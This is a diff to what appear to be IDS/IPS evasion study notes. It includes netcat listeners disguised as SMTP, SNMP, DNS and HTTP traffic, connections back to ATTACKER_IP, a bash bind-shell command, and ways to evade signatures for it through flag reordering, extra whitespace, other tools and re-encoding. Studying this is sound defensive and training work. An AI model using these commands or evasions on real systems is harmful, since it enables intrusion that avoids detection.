@@ -20,9 +20,9 @@ Rely on a Different Protocol:
 
 Informational:
   Consider the following two examples:
-    Running ncat -lvnp 25 on the attacker system and connecting to it will give the impression that
+    Running nc -lvnp 25 on the attacker system and connecting to it will give the impression that
     it is a usual TCP connection with an SMTP server, unless the IDS/IPS provides deep packet inspection (DPI).
-    Executing ncat -ulvnp 162 on the attacker machine and connecting to it will give the illusion
+    Executing nc -ulvnp 162 on the attacker machine and connecting to it will give the illusion
     that it is a regular UDP communication with an SNMP server unless the IDS/IPS supports DPI.
 
 Manipulate (Source) TCP/UDP Port:
@@ -30,3 +30,14 @@ Manipulate (Source) TCP/UDP Port:
   nc -u ATTACKER_IP 53   On the target, you can make it connect to the listening server
   nc -lvnp 80            Alternatively, you can make it appear more like web traffic where clients communicate with an HTTP server
   nc ATTACKER_IP 80      On the target, you can make it connect to the listening server
+
+Modify the data:
+  If you want to use Ncat to create a bind shell, the following command: `ncat -lvnp 1234 -e /bin/bash`
+  tells ncat to listen on TCP port `1234` and bind Bash shell to it. If you want to detect packets containing
+  such commands (wireshark), you need to think of something specific to match the signature but not too specific.
+    - Scanning for ncat -lvnp can be easily evaded by changing the order of the flags.
+    - Inspecting the payload for `ncat -` can be evaded by adding an extra white space, such as `ncat  -` which would still run correctly on the target system.
+    - If the IDS is looking for `ncat`, then we need to consider more sophisticated approaches depending on the target system/application. 
+    One option would be to use a different command such as nc socat. Alternatively, you can consider a different encoding if the target system can process it properly.
+
+  
